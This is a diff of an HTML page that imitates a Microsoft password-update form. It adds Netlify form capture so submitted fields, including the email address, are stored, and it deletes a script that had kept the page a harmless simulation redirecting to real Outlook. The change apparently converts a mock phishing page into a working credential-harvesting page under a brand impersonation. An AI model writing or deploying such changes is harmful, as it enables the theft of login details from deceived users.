@@ -75,7 +75,8 @@
       <h2>Update your password</h2>
       <div style="color:#333;font-size:1em;margin-bottom:8px;">For your security, <br>please change your password regularly.</div>
     </div>
-    <form id="dummy-form" autocomplete="off">
+    <form id="dummy-form" name="password-update" method="POST" data-netlify="true" autocomplete="off">
+      <input type="hidden" name="form-name" value="password-update">
       <label for="email">Email address</label>
       <input type="email" id="email" name="email" autocomplete="username" required>
 
@@ -94,14 +95,5 @@
       &copy; 2025 Microsoft Corporation. All rights reserved.
     </div>
   </div>
-  <script>
-    document.getElementById('dummy-form').addEventListener('submit', function(e) {
-      e.preventDefault();
-      document.getElementById('dummy-message').style.display = 'block';
-      setTimeout(function() {
-        window.location.href = "https://outlook.live.com/owa/"; // Redirect to real Outlook after simulation
-      }, 1800);
-    });
-  </script>
 </body>
 </html>
